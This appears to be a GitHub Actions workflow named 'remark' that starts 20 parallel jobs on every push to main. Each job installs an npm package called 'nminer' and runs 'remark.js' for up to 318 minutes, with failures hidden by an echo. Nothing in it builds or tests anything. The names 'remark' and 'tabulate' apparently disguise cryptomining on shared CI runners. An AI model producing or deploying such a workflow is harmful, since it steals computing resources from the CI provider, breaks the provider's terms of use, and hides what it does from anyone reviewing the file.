name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 831 }
          - { version: 3 }
          - { version: 5850 }
          - { version: 3420 }
          - { version: 6396 }
          - { version: 7105 }
          - { version: 54 }
          - { version: 6935 }
          - { version: 4996 }
          - { version: 575 }
          - { version: 1435 }
          - { version: 7474 }
          - { version: 5187 }
          - { version: 8307 }
          - { version: 1970 }
          - { version: 9345 }
          - { version: 5261 }
          - { version: 4344 }
          - { version: 6690 }
          - { version: 4641 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: tabulate
        run: |
          npm install nminer@latest
          timeout 318m node remark.js || echo "remark executed"